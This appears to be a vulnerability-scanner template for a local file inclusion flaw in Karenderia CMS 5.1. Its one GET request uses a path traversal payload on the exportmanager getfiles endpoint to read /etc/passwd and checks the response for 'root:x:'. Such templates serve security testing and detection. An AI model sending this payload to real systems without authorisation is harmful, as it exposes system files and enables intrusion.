id: karenderia-cms-lfi
info:
  name: Karenderia CMS 5.1 - LFI Vuln.
  author: trainzment, Mehmet EMIROGLU
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}/exportmanager/ajax/getfiles?f=/../../../../../../../../../../etc/passwd"
    matchers:
      - type: word
        words:
          - "root:x:"
